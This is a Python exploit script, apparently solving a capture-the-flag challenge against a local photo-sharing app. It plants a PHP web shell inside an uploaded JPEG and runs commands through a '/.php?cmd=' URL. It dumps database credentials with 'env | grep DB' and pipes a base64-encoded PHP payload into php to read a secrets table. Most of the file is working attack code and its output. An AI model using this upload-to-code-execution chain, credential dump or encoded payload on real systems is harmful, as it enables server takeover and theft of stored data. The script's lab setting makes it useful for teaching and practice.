import requests
import base64

def shell_exec(cmd):
    url = "http://localhost:8000/user-data/d86d6b84-5825-46e4-a0ae-0d48efb67901.jpg"
    postfix = "/.php?cmd="
    r = requests.get(url + postfix + cmd)
    print(url + postfix + cmd)
    offset = 1548
    print(r.text[offset:offset+100])
    # print(r.text)


# ------------------------------
"""step 1:
    - manually put the string <?php system($_GET["cmd"]) ?> in the middle of a random jpeg (cane2.jpeg)
    - manually upload cane2.jpeg, and put the url of the uploaded image in the url param in shell_exec()"""
# ------------------------------


# ------------------------------
"step2: execute the command: env | grep DB"
# ------------------------------
expl = "env | grep DB"
# output:
# DB_NAME=sharepic
# DB_PASS=redacted
# DB_HOST=db
# DB_USER=sharepic


# ------------------------------
"step3: execute a command that reads the db, using the credentials we dumped"
# ------------------------------

payload = b"""
<?php
echo "starting exploit...";
$sql = "select flag from secrets";
$db = new PDO(
    "mysql:host=db;dbname=sharepic",
    "sharepic",
    "redacted",
    [ PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, ]
    );
foreach ($db->query($sql) as $row) {
    var_dump($row);
}
"""
# this has encoding issues with the b64 character +/
# payload_b = base64.b64encode(payload).decode()
# expl = f"echo {payload_b} | base64 -d | php"
#expl = f"echo {payload_b} | base64 -d > debug.txt" #corrupted data!


payload_b = base64.urlsafe_b64encode(payload).decode() #replaces +/ with -_
str_slash_plus = "$(echo -n ' 2f2b' | xxd -rp)" #evaluates to the string "/+"
expl = f"echo {payload_b} | tr '_-' {str_slash_plus} | base64 -d | php"
#out:
# starting exploit...object(stdClass)#4 (1) {
#   ["flag"]=>
#   string(14) "CCIT{REDACTED}"
# }



shell_exec(expl)
